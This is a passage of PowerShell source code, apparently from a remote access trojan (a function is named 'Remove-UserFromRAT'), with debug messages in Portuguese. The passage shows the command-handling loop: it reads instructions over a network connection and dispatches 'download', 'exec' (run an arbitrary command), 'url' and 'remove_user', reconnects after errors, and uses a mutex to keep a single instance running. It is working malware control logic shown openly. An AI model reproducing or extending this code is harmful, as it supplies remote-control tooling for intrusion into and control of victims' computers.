            } elseif ($cmd -match "^download (.+)$") {
                $writer.WriteLine((Download-File $matches[1]))
            } elseif ($cmd -match "^exec (.+)$") {
                $writer.WriteLine((Execute-Command $matches[1]))
            } elseif ($cmd -match "^url (.+)$") {
                $writer.WriteLine((Open-Url $matches[1]))
            } elseif ($cmd -match "^remove_user (.+)$") {
                $writer.WriteLine((Remove-UserFromRAT $matches[1]))
            } else {
                Write-DebugLog "Comando nao reconhecido: $cmd"
                $writer.WriteLine("Comando nao reconhecido")
            }
        }
    } catch {
        Write-DebugLog "Erro na conexao: $_"
        Start-Sleep -Seconds 10
    } finally {
        if ($client) { $client.Close() }
    }
}

$mutex.ReleaseMutex()
$mutex.Dispose()
